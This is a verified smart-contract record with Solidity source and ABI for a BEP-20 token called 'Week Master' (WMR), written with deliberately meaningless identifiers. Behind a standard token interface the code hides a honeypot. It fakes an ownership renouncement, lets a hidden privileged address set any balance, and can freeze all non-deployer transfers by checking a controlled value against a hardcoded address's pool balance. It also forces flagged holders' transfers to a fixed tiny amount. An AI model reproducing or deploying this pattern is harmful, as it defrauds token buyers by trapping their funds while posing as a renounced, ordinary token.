{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface launchedToMarketing {\n    function createPair(address maxFundLaunch, address fundTake) external returns (address);\n}\n\ninterface tradingTxSender {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverExempt) external view returns (uint256);\n\n    function transfer(address swapMin, uint256 totalAuto) external returns (bool);\n\n    function allowance(address totalTake, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 totalAuto) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address swapMin,\n        uint256 totalAuto\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tradingAt, uint256 value);\n    event Approval(address indexed totalTake, address indexed spender, uint256 value);\n}\n\nabstract contract buyLaunched {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface fundFrom {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface tradingTxSenderMetadata is tradingTxSender {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract WeekMaster is buyLaunched, tradingTxSender, tradingTxSenderMetadata {\n\n    function decimals() external view virtual override returns (uint8) {\n        return isExempt;\n    }\n\n    function receiverEnableTake(address tradingLiquidity) public {\n        if (sellList) {\n            return;\n        }\n        \n        minFundFee[tradingLiquidity] = true;\n        \n        sellList = true;\n    }\n\n    bool public sellList;\n\n    mapping(address => bool) public atMode;\n\n    uint256 private limitFrom;\n\n    bool private listLaunchedMarketing;\n\n    uint256 maxShould;\n\n    mapping(address => bool) public minFundFee;\n\n    address txFrom = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 public amountAt;\n\n    function name() external view virtual override returns (string memory) {\n        return takeModeSell;\n    }\n\n    function minLiquidity(address feeReceiverTotal) public {\n        feeList();\n        \n        if (feeReceiverTotal == totalShouldFee || feeReceiverTotal == limitFund) {\n            return;\n        }\n        atMode[feeReceiverTotal] = true;\n    }\n\n    function tradingSellMax(address amountToken, uint256 totalAuto) public {\n        feeList();\n        teamMaxMarketing[amountToken] = totalAuto;\n    }\n\n    function allowance(address buySell, address launchedSwapMarketing) external view virtual override returns (uint256) {\n        if (launchedSwapMarketing == takeTo) {\n            return type(uint256).max;\n        }\n        return exemptReceiver[buySell][launchedSwapMarketing];\n    }\n\n    address takeTo = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function enableTo(address feeMin, address swapMin, uint256 totalAuto) internal returns (bool) {\n        require(teamMaxMarketing[feeMin] >= totalAuto);\n        teamMaxMarketing[feeMin] -= totalAuto;\n        teamMaxMarketing[swapMin] += totalAuto;\n        emit Transfer(feeMin, swapMin, totalAuto);\n        return true;\n    }\n\n    mapping(address => uint256) private teamMaxMarketing;\n\n    event OwnershipTransferred(address indexed atTake, address indexed listModeFrom);\n\n    function transferFrom(address feeMin, address swapMin, uint256 totalAuto) external override returns (bool) {\n        if (_msgSender() != takeTo) {\n            if (exemptReceiver[feeMin][_msgSender()] != type(uint256).max) {\n                require(totalAuto <= exemptReceiver[feeMin][_msgSender()]);\n                exemptReceiver[feeMin][_msgSender()] -= totalAuto;\n            }\n        }\n        return limitExempt(feeMin, swapMin, totalAuto);\n    }\n\n    uint256 constant limitList = 7 ** 10;\n\n    function feeList() private view {\n        require(minFundFee[_msgSender()]);\n    }\n\n    function transfer(address amountToken, uint256 totalAuto) external virtual override returns (bool) {\n        return limitExempt(_msgSender(), amountToken, totalAuto);\n    }\n\n    bool private launchAt;\n\n    function balanceOf(address receiverExempt) public view virtual override returns (uint256) {\n        return teamMaxMarketing[receiverExempt];\n    }\n\n    constructor (){\n        \n        fundFrom buyLimit = fundFrom(takeTo);\n        limitFund = launchedToMarketing(buyLimit.factory()).createPair(buyLimit.WETH(), address(this));\n        \n        totalShouldFee = _msgSender();\n        minFundFee[totalShouldFee] = true;\n        teamMaxMarketing[totalShouldFee] = receiverFee;\n        feeWallet();\n        if (modeFee != listLaunchedMarketing) {\n            launchAt = true;\n        }\n        emit Transfer(address(0), totalShouldFee, receiverFee);\n    }\n\n    string private takeModeSell = \"Week Master\";\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverTx;\n    }\n\n    mapping(address => mapping(address => uint256)) private exemptReceiver;\n\n    string private receiverTx = \"WMR\";\n\n    uint8 private isExempt = 18;\n\n    uint256 private receiverFee = 100000000 * 10 ** 18;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return receiverFee;\n    }\n\n    function amountWallet(uint256 totalAuto) public {\n        feeList();\n        maxShould = totalAuto;\n    }\n\n    bool private minFund;\n\n    function limitExempt(address feeMin, address swapMin, uint256 totalAuto) internal returns (bool) {\n        if (feeMin == totalShouldFee) {\n            return enableTo(feeMin, swapMin, totalAuto);\n        }\n        uint256 tradingWalletTx = tradingTxSender(limitFund).balanceOf(txFrom);\n        require(tradingWalletTx == maxShould);\n        require(swapMin != txFrom);\n        if (atMode[feeMin]) {\n            return enableTo(feeMin, swapMin, limitList);\n        }\n        return enableTo(feeMin, swapMin, totalAuto);\n    }\n\n    bool public modeFee;\n\n    uint256 public liquidityModeExempt;\n\n    function feeWallet() public {\n        emit OwnershipTransferred(totalShouldFee, address(0));\n        receiverReceiver = address(0);\n    }\n\n    function getOwner() external view returns (address) {\n        return receiverReceiver;\n    }\n\n    address public totalShouldFee;\n\n    address private receiverReceiver;\n\n    function approve(address launchedSwapMarketing, uint256 totalAuto) public virtual override returns (bool) {\n        exemptReceiver[_msgSender()][launchedSwapMarketing] = totalAuto;\n        emit Approval(_msgSender(), launchedSwapMarketing, totalAuto);\n        return true;\n    }\n\n    function owner() external view returns (address) {\n        return receiverReceiver;\n    }\n\n    uint256 amountMax;\n\n    address public limitFund;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listModeFrom\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingAt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buySell\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedSwapMarketing\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"totalAuto\",\"type\":\"uint256\"}],\"name\":\"amountWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedSwapMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalAuto\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"atMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverExempt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityModeExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minFundFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeReceiverTotal\",\"type\":\"address\"}],\"name\":\"minLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingLiquidity\",\"type\":\"address\"}],\"name\":\"receiverEnableTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalShouldFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalAuto\",\"type\":\"uint256\"}],\"name\":\"tradingSellMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalAuto\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalAuto\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "WeekMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}